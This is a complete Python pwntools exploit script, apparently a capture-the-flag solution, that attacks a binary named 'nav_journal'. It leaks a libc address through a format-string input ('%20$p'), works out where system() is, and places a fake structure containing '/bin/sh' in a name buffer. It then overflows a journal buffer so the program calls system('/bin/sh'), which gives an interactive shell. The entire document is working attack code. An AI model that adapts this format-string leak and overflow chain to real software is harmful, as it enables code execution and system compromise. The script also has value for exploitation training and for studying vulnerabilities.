from pwn import *


_puts_call = 0x80490A0
read_got = 0x804C00C
puts_got = 0x804C028
name_addr = 0x804C120

libc_offset_leak = 0x1b2000

if __name__ == "__main__":


	#p = remote( '', ) 
	p = process( ["./ld-2.23.so", "--library-path","libs/","./nav_journal"] )
	libc = ELF( "libs/libc.so.6" )
	#gdb.attach( p, '''b *fclose
	#	continue''' ) 

	p.recvuntil( ": " )
	p.send( "some" + '\n' )

	p.recvuntil( "> " )
	p.send( "4\n" ) # create sub journal
	p.recvuntil( ": " )
	p.send( "N\n" )
	p.recvuntil( ": " )
	p.send( "%20$p\n" )
	leak = p.recvline()
	
	addr = int( leak.split( "/tmp/" )[ 1 ], 16 )
	base = addr - libc_offset_leak

	system = base + libc.symbols[ 'system' ]

	print "[+] system: 0x%x" % system

	p.recvuntil( "> " )
	p.send( "8\n" )
	p.recvuntil( ": " )

	payload  = "/bin" # +0
	payload += "/sh\x00" # +4
	payload += p32( 0x0 ) # +8
	payload += p32( 0x0 ) # +12
	payload += p32( 0x0 ) # +16
	payload = payload.ljust( 0x44, '\x00' )

	payload += p32( system )
	payload += p32( name_addr + 16 )
	payload += p32( name_addr )

	p.send( payload + '\n' )

	p.recvuntil( "> ")
	p.send( "5\n" ) # write sub journal

	p.recvuntil( ": " )
	p.send( "a" * (1024+512) + p32( name_addr ) )
	p.recvuntil( "> " )
	p.send( "3\n" )

	p.interactive()